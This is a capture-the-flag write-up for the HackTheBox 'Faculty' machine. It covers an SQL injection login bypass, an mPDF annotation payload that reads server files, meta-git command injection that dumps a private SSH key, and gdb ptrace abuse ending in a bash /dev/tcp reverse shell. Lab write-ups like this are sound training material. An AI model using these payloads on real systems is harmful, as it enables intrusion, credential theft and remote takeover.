---
title: "Faculty Machine Writeup"
classes: wide
header:
  teaser: /assets/images/hackthebox/Faculty.png
ribbon: red
description: "Faculty is medium machine"
categories:
  - HackTheBox
toc: false
---

<img src="/assets/images/hackthebox/Faculty.png" style="zoom:50%;" />

## Recon

First, let's start with nmap port scanning.

![](/assets/images/hackthebox/nmap-results.png)

We can see that port 80 is open so let's check the running web service.

![](/assets/images/hackthebox/Website.png)

Running gobuster against the site. it shows the following results:

![](/assets/images/hackthebox/gobuster-1.png)

This `/admin` path looks interesting, so let's run gobuster against it (this will come in handy later).

![](/assets/images/hackthebox/gobuster-2.png)

Now if we can go to the `/admin` path we can see a login page.

I tried admin/admin as the login creds but it didn't work, so I tried basic SQL injection ` admin' or 1=1 -- -` in the username field and it successfully bypassed the login page.

![](/assets/images/hackthebox/bypass-login.png)

![](/assets/images/hackthebox/administrator-page.png)

After some checks in website I found a page where I can upload a new pdf file and download a pdf file containing the list of uploaded pdfs.

![faculty-list](/assets/images/hackthebox/faculty-list.png)

When I clicked on the download pdf button, I noticed `mpdf` in the generated file url.

![](/assets/images/hackthebox/mpdf.png)

Searching for `mpdf`, it turned out to be a `PHP library which generates PDF files from UTF-8 encoded HTML`.

We can also intercept the request in burp and decode the `pdf` parameter to see the decoded HTML file ( base64 and url decode twice).

![pdf-burp](/assets/images/hackthebox/pdf-burp.png)

A quick search and I found a vulnerability for `mpdf` library (CVE-2019-1000005).

We can test that the vulnerability works using (\<img src="http://10.10.x.x/"\>) as the HTML file then encode it and replace the pdf parameter in the burp request with it.

![cyberchef](/assets/images/hackthebox/cyberchef.png)

nc returns a response, NOICE!

![](/assets/images/hackthebox/test-vuln-2.png)

## Shell as gbyolo

Now that the vulnerability is working, we can try to read different files from the server using this payload:

`<annotation file=\"/etc/passwd\" content=\"/etc/passwd\"  icon=\"Graph\" title=\"Attached File: /etc/passwd\" pos-x=\"195\" />`

![](/assets/images/hackthebox/lfi.png)

`/etc/passwd`

<img src="/assets/images/hackthebox/passwd.png" style="zoom: 67%;" /> 

`./login.php`

![](/home/emperor10/Pictures/login.png)

Notice the included file `./db_connect.php`, let's try to read it.

![](/assets/images/hackthebox/db_connect.png)

We found a password, so I tried it with the username `gbyolo` as ssh creds.

username: `gbyolo`
password: `Co.met06aci.dly53ro.per`

![](/assets/images/hackthebox/gbyolo-user.png)

## Shell as developer

Running `sudo -l`, we can see that `gbyolo` user can run `meta-git` (a NPM package that can manage your meta repo and child git repositories) as `developer` user.

I found a [report](https://hackerone.com/reports/728040) on hackerone showing an RCE exploit for this package so I crafted this payload to read the rsa key for the `developer` user.

`sudo -u developer /usr/local/bin/meta-git clone 'test||cat /home/developer/.ssh/id_rsa' `.

![](/assets/images/hackthebox/developer-id_rsa.png)

> Remember to change the permissions of the `id_rsa` file to 600

Now we can ssh into box with `developer` user and read `user.txt`.

![](/assets/images/hackthebox/developer-user.png)

## Shell as root

Running [linPEAS](https://github.com/carlospolop/PEASS-ng/tree/master/linPEAS), I found that `gdb` has `CAP_SYS_PTRACE` capability which allows it to debug any other process.

![](/assets/images/hackthebox/gdb.png)

So let's search for a python process running as `root` user to be able to run a system command using python's `system()` function:

`ps aux | grep "^root.*python3" | awk '{print $2}'`

Found one, now attach gdb to it.

`gdb -p $PID`

![gdb](/assets/images/hackthebox/gdb-exploit-1.png)

Finally run a nc listener on our side and call `system()` function to get a reverse shell.

`call (void)system("bash -c 'bash -i >& /dev/tcp/10.10.x.x/4444 0>&1'")` 

![gdb](/assets/images/hackthebox/gdb-exploit-2.png)

![gdb](/assets/images/hackthebox/root.png)